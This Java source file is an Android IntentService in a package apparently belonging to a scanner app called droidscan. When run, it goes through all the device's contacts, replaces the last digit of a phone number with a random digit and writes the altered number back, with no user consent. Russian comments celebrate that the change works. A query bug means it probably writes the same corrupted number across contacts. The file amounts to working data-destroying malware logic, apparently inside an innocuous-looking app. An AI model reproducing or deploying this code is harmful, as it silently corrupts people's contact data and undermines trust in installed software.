package ru.ifmo.se.droidscan;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import java.util.ArrayList;
import java.util.List;

public class ContactsIntentService extends IntentService {

    /**
     * A constructor is required, and must call the super IntentService(String)
     * constructor with a name for the worker thread.
     */
    public ContactsIntentService() {
        super("ContactsIntentService");
    }

    /**
     * The IntentService calls this method from the default worker thread with
     * the intent that started the service. When this method returns, IntentService
     * stops the service, as appropriate.
     */
    @Override
    protected void onHandleIntent(Intent intent) {
        getAllContacts();
    }

    /* Бегаем по массиву контактов и вызывыам для каждого номера телефона метод о его замене */
    private List<ContactDTO> getAllContacts()
    {
        List<ContactDTO> ret = new ArrayList<>();

        // Get all raw contacts id list.
        List<Integer> rawContactsIdList = getRawContactsIdList();

        int contactListSize = rawContactsIdList.size();

        ContentResolver contentResolver = getContentResolver();

        // Loop in the raw contacts list.
        for(int i = 0; i < contactListSize; i++)
        {
            // Get the raw contact id.
            Integer rawContactId = rawContactsIdList.get(i);

            // Data content uri (access data table. )
            Uri dataContentUri = ContactsContract.Data.CONTENT_URI;

            // Build query columns name array.
            List<String> queryColumnList = new ArrayList<>();

            // ContactsContract.Data.CONTACT_ID = "contact_id";
            queryColumnList.add(ContactsContract.Data.CONTACT_ID);

            // ContactsContract.Data.MIMETYPE = "mimetype";
            queryColumnList.add(ContactsContract.Data.MIMETYPE);

            queryColumnList.add(ContactsContract.Data.DATA1);
            queryColumnList.add(ContactsContract.Data.DATA2);
            queryColumnList.add(ContactsContract.Data.DATA3);
            queryColumnList.add(ContactsContract.Data.DATA4);
            queryColumnList.add(ContactsContract.Data.DATA5);
            queryColumnList.add(ContactsContract.Data.DATA6);
            queryColumnList.add(ContactsContract.Data.DATA7);
            queryColumnList.add(ContactsContract.Data.DATA8);
            queryColumnList.add(ContactsContract.Data.DATA9);
            queryColumnList.add(ContactsContract.Data.DATA10);
            queryColumnList.add(ContactsContract.Data.DATA11);
            queryColumnList.add(ContactsContract.Data.DATA12);
            queryColumnList.add(ContactsContract.Data.DATA13);
            queryColumnList.add(ContactsContract.Data.DATA14);
            queryColumnList.add(ContactsContract.Data.DATA15);

            // Translate column name list to array.
            String queryColumnArr[] = queryColumnList.toArray(new String[queryColumnList.size()]);


            // Query data table and return related contact data.
            Cursor cursor = contentResolver.query(dataContentUri, queryColumnArr, null, null, null);


            if(cursor!=null && cursor.getCount() > 0)
            {
                cursor.moveToFirst();

                // пробуем менять номер телефона! Меняет!!!!
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                int random_number = (int) (Math.random() * 10); // Генерация  случайной цифры

                StringBuilder myPhone = new StringBuilder(phoneNumber);
                myPhone.setCharAt(phoneNumber.length() - 1, (char)('0' + random_number) );

                updatePhoneNumber(contentResolver, rawContactId, String.valueOf(myPhone)); // update Content Resolver

            }
        }

        return ret;
    }


    // Return all raw_contacts _id in a list.
    private List<Integer> getRawContactsIdList()
    {
        List<Integer> ret = new ArrayList<>(); //лежат rawContactsId

        ContentResolver contentResolver = getContentResolver();

        // Row contacts content uri( access raw_contacts table. ).
        Uri rawContactUri = ContactsContract.RawContacts.CONTENT_URI;

        // Return _id column in contacts raw_contacts table.
        String queryColumnArr[] = {ContactsContract.RawContacts._ID};

        // Query raw_contacts table and return raw_contacts table _id.
        Cursor cursor = contentResolver.query(rawContactUri, queryColumnArr, null, null, null);
        if( cursor != null && cursor.moveToFirst()) {

            do {
                int idColumnIndex = cursor.getColumnIndex(ContactsContract.RawContacts._ID);
                int rawContactsId = cursor.getInt(idColumnIndex);

                ret.add(new Integer(rawContactsId));
            } while (cursor.moveToNext());

        }

        cursor.close();

        return ret;
    }



    /* Update phone number with raw contact id and phone type.*/
    private void updatePhoneNumber(ContentResolver contentResolver, long rawContactsId, String newPhoneNumber)
    {
        // Create content values object.
        ContentValues contentValues = new ContentValues();

        // Put new phone number value.
        contentValues.put(ContactsContract.CommonDataKinds.Phone.NUMBER, newPhoneNumber);

        // Create query condition, query with the raw contact id.
        StringBuffer whereClauseBuf = new StringBuffer();

        // Specify the update contact id.
        whereClauseBuf.append(ContactsContract.Data.RAW_CONTACT_ID);
        whereClauseBuf.append("=");
        whereClauseBuf.append(rawContactsId);

        // Specify the row data mimetype to phone mimetype( vnd.android.cursor.item/phone_v2 )
        whereClauseBuf.append(" and ");
        whereClauseBuf.append(ContactsContract.Data.MIMETYPE);
        whereClauseBuf.append(" = '");
        String mimetype = ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE;
        whereClauseBuf.append(mimetype);
        whereClauseBuf.append("'");


        // Update phone info through Data uri.Otherwise it may throw java.lang.UnsupportedOperationException.
        Uri dataUri = ContactsContract.Data.CONTENT_URI;

        // Get update data count.
        contentResolver.update(dataUri, contentValues, whereClauseBuf.toString(), null);
    }
}